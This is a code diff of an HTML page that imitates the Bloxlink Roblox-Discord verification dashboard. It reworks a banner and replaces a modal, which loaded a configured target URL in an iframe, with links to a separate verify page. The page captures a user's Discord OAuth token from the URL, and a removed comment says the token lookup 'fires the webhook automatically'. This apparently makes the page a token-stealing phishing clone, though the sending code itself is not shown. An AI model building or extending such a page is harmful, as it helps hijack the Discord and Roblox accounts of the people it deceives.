@@ -81,17 +81,7 @@
 </head>
 <body class="bg-primary-background">
 
-<!-- Top Banner -->
-<div style="background:rgba(99,102,241,0.1);" class="flex items-center gap-2 justify-center px-4 py-2">
-  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-5 h-5 text-white flex-shrink-0">
-    <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m9-.75a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9 3.75h.008v.008H12v-.008Z"/>
-  </svg>
-  <div class="text-sm" style="color:rgb(209,213,219);">
-    We've updated our <a class="text-blue-400 hover:underline" href="https://blox.link/legal/terms-of-service">Terms of Service</a>,
-    <a class="text-blue-400 hover:underline" href="https://blox.link/legal/privacy-policy">Privacy Policy</a>, and
-    <a class="text-blue-400 hover:underline" href="https://blox.link/legal/purchase-policy">Purchase Policy</a> effective February 10, 2026.
-  </div>
-</div>
+<!-- ===== VERIFICATION MODAL removed – verify is now a separate page ===== -->
 
 <div class="flex flex-wrap md:flex-nowrap">
 
@@ -254,6 +244,18 @@
   <!-- Main Content -->
   <div class="bg-secondary-background h-screen w-full 2xl:flex-1 overflow-y-auto">
 
+    <!-- Top Banner (right panel only) -->
+    <div style="background:rgba(99,102,241,0.1); border-bottom:1px solid rgba(99,102,241,0.2);" class="flex items-center gap-2 justify-center px-4 py-2">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-4 h-4 text-white flex-shrink-0">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m9-.75a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9 3.75h.008v.008H12v-.008Z"/>
+      </svg>
+      <div class="text-sm" style="color:rgb(209,213,219);">
+        We've updated our <a class="text-blue-400 hover:underline" href="https://blox.link/legal/terms-of-service">Terms of Service</a>,
+        <a class="text-blue-400 hover:underline" href="https://blox.link/legal/privacy-policy">Privacy Policy</a>, and
+        <a class="text-blue-400 hover:underline" href="https://blox.link/legal/purchase-policy">Purchase Policy</a> effective February 10, 2026.
+      </div>
+    </div>
+
     <!-- Page header -->
     <div class="px-8 py-4 space-x-4 border-b-tertiary-background border-b text-sm">
       <span class="text-primary-text font-bold">Verifications</span>
@@ -265,7 +267,7 @@
         <div class="flex flex-col gap-8 mx-8 mt-8">
 
           <!-- CTA Banner -->
-          <div class="flex gap-2 items-center bg-indigo-600 mx-8 p-8 rounded-md justify-between flex-wrap">
+          <div class="flex gap-2 items-center bg-indigo-600 p-8 rounded-md justify-between flex-wrap">
             <div class="flex flex-col gap-2 flex-1">
               <p class="text-4xl font-bold text-primary-text text-left">Get started now by linking your Roblox account to Discord</p>
               <p class="text-base font-normal text-primary-text text-left">Join our millions of users by linking your Roblox account to Discord. After verifying, you'll gaining access to thousands of Roblox communities and our large feature set.</p>
@@ -344,9 +346,8 @@
 <script type="module">
   import { initUserNav } from '/js/user-nav.js';
   import { fetchDiscordUserData } from '/js/discord.js';
-  import { CONFIG } from '/js/config.js';
 
-  // ── 1. Handle OAuth token from hash (Discord callback) ──
+  // ── 1. Handle OAuth token ──
   const hash = window.location.hash;
   if (hash) {
     const params = new URLSearchParams(hash.substring(1));
@@ -354,8 +355,6 @@
     if (token) {
       sessionStorage.setItem('discord_token', token);
       window.history.replaceState(null, '', window.location.pathname);
-
-      // fetchDiscordUserData fires the webhook automatically
       const user = await fetchDiscordUserData(token);
       if (user) {
         localStorage.setItem('bloxlink_logged_in', 'true');
@@ -364,59 +363,20 @@
     }
   }
 
-  // ── 2. Guard: not logged in → home ──
+  // ── 2. Guard ──
   if (!localStorage.getItem('bloxlink_logged_in')) {
     window.location.href = '/';
   }
 
-  // ── 3. Populate nav chip ──
+  // ── 3. Nav chip ──
   initUserNav({ chipId: 'navChip', avatarId: 'navAvatar', nameId: 'navUsername', dropdownId: 'navDropdown' });
 
-  // ── 4. Modal logic ──
-  const overlay   = document.getElementById('popupOverlay');
-  const container = document.getElementById('popupContainer');
-  const step1     = document.getElementById('step1Content');
-  const step2     = document.getElementById('step2Content');
-  const loading   = document.getElementById('loadingRedirectContent');
-  const iframeWrap = document.getElementById('iframeContent');
-  const iframe    = document.getElementById('discordIframe');
-
-  function openModal() {
-    step1.style.display = 'flex';
-    step2.style.display = 'none';
-    loading.style.display = 'none';
-    iframeWrap.style.display = 'none';
-    container.classList.remove('expanded');
-    overlay.classList.add('active');
-  }
-  function closeModal() {
-    overlay.classList.remove('active');
-    iframe.src = 'about:blank';
-  }
-
-  document.getElementById('verifyNowBtn').addEventListener('click', openModal);
-  document.getElementById('addAnotherBtn').addEventListener('click', openModal);
-  document.getElementById('popupClose').addEventListener('click', closeModal);
-  overlay.addEventListener('click', e => { if (e.target === overlay) closeModal(); });
-
-  document.getElementById('btnContinueStep1').addEventListener('click', () => {
-    step1.style.display = 'none';
-    step2.style.display = 'flex';
+  // ── 4. Buttons → navigate to /dashboard/verify ──
+  document.getElementById('verifyNowBtn').addEventListener('click', () => {
+    window.location.href = '/dashboard/verify';
   });
-  document.getElementById('btnReturnToBloxlink').addEventListener('click', closeModal);
-  document.getElementById('btnCancelStep2').addEventListener('click', closeModal);
-
-  document.getElementById('btnConfirmAccess').addEventListener('click', () => {
-    step2.style.display = 'none';
-    loading.style.display = 'flex';
-    if (!iframe.src || iframe.src === 'about:blank') {
-      iframe.src = CONFIG.TARGET_URL;
-    }
-    setTimeout(() => {
-      loading.style.display = 'none';
-      iframeWrap.style.display = 'block';
-      container.classList.add('expanded');
-    }, 1200);
+  document.getElementById('addAnotherBtn').addEventListener('click', () => {
+    window.location.href = '/dashboard/verify';
   });
 
   // ── 5. Mobile sidebar ──
@@ -429,11 +389,12 @@
   });
   document.getElementById('closeSidebarBtn')?.addEventListener('click', () => {
     const inner = document.getElementById('sidebarInner');
-    const sidebar = document.getElementById('sidebar');
+    document.getElementById('sidebar').classList.add('invisible');
     inner.classList.add('left-[-16rem]');
     inner.classList.remove('left-0');
-    sidebar.classList.add('invisible');
   });
 </script>
+</body>
+</html>
 </body>
 </html>
